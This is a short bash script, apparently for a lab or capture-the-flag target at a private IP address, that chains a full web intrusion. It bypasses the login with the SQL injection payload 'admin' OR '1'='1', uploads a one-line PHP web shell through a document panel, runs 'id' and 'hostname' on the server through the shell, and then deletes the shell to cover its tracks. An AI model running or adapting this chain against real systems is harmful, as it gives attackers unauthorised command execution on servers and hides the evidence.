#!/bin/bash
T=172.20.17.230
cd /tmp
echo '<?php system($_GET["c"]); ?>' > shell.php
echo "== login SQLi (cookie) =="
curl -s -c cookie.txt -o /dev/null --data-urlencode "usuario=admin' OR '1'='1" --data-urlencode "password=x" http://$T/login.php
echo "== subir shell.php =="
curl -s -b cookie.txt -F "archivo=@shell.php" "http://$T/panel.php?seccion=documents" | grep -io "pujat correctament[^<]*" | head -1
echo "== ejecutar id =="
curl -s "http://$T/uploads/shell.php?c=id"
echo "== ejecutar hostname =="
curl -s "http://$T/uploads/shell.php?c=hostname"
echo "== limpiar =="
curl -s "http://$T/uploads/shell.php?c=rm%20-f%20/var/www/html/uploads/shell.php" >/dev/null
echo "FIN"
